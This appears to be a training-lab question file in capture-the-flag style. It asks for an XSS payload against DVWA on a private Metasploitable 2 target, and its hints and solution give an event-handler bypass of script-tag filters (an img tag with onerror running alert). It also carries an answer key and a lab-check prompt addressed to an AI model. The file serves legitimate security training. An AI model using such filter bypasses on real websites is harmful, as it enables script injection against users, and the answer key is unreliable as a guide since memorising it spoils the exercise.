# Q088 — DVWA CSP Concept

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🔴 Hard |
| **Tools** | `burpsuite`, `sqlmap`, `gobuster`, `nikto`, `curl` |
| **Time budget** | 15–25 min |

---

## 📝 Question

DVWA high security XSS uses content filters. Provide a payload that bypasses simple `<script>` blacklist using event handler.

---

## 🎯 Flag Format

```
payload=<text>
```

Example: `payload=<img src=x onerror=alert(1)>`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`onerror`, `onload`, `onclick` handlers bypass simple script-tag filter.
</details>

<details>
<summary>Hint 2</summary>

SVG also useful.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
<img src=x onerror=alert(1)>
```

Triggers alert without literal <script>.

**Answer:** `payload=<img src=x onerror=alert(1)>`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q088".
```
